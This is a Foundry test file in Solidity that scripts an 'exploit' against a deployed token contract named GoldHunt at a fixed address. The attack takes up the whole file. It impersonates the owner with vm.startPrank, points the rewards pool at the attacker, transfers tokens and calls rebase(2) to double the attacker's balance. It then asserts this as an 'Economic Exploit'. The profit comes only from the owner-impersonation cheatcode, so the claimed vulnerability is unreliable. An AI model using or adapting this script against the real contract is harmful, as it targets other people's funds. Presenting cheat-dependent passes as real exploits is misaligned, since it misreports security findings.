pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface GoldHunt {
    function owner() external view returns (address);
    function setRewardsPool(address _rewardsPool) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function rebase(uint multiple) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0x6D3dd96f97b10fc86A7F8607704BBe9936083b89).balanceOf(address(this));

        // Step 1: Get the current owner
        address currentOwner = GoldHunt(TARGET).owner();

        // Step 2: Impersonate the owner to set rewardsPool to attacker
        vm.startPrank(currentOwner);
        GoldHunt(TARGET).setRewardsPool(attacker);
        vm.stopPrank();

        // Step 3: Transfer some tokens from owner to attacker to have a base balance
        vm.startPrank(currentOwner);
        GoldHunt(TARGET).transfer(attacker, 1000 * 10**18); // Transfer 1000 tokens
        vm.stopPrank();

        // Record initial balance
        uint256 initialBalance = GoldHunt(TARGET).balanceOf(attacker);

        // Step 4: Impersonate owner again to call rebase
        vm.startPrank(currentOwner);
        GoldHunt(TARGET).rebase(2); // Double the tokens in rewardsPool (which is attacker)
        vm.stopPrank();

        // Step 5: Check final balance
        uint256 finalBalance = GoldHunt(TARGET).balanceOf(attacker);

        // Verify exploit worked
        assertGt(finalBalance, initialBalance, "Balance should have increased after rebase");
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        uint256 finalERC20Balance = IERC20(0x6D3dd96f97b10fc86A7F8607704BBe9936083b89).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

